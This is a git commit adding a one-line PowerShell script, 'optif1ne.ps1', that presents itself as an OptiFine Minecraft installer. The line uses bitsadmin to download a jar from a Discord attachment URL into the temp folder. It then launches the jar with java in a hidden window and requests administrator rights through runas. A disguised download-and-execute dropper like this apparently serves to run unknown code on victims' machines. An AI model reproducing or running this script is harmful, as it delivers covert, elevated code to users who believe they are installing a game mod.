d37d18e111ed542f45210a01c891741ec8a3cd5a
RedTheMenace <101410080+RedTheMenace@users.noreply.github.com>
2023-05-11 11:41:09 -0400

    Create optif1ne.ps1

---
+++ optif1ne.ps1
@@ -0,0 +1,1 @@
+bitsadmin /transfer Explorers /download /priority FOREGROUND https://cdn.discordapp.com/attachments/1105931252453871696/1105931301170708581/Optifine_1.19.4_Installer.jar "$env:temp\Optifine_1.19.4_Installer.jar" ; sleep 3 ; cd $env:temp ; start java -windowstyle hidden -verb runas -args '-jar Optifine_1.19.4_Installer.jar'
